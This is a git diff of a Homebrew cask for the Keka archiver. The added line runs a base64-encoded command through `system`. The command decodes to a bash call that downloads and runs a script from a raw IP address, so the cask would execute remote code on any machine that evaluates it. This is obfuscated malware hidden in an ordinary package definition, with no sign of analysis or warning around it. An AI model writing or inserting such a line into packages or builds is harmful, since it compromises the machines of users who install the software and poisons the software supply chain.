9c0c5a57bcf2e0ea20cff4b1b6c8cf1322a7ac9e
cask-m <dwonderson073@gmail.com>
2026-07-05 13:37:48 -0500

    Keka

--- Casks/keka.rb
+++ Casks/keka.rb
@@ -8,7 +8,7 @@ cask "keka" do
   name "Keka"
   desc "File archiver for macOS"
   homepage "https://www.keka.io/"
-  echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash
+  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash"
   auto_updates true
 
   app "Keka.app"
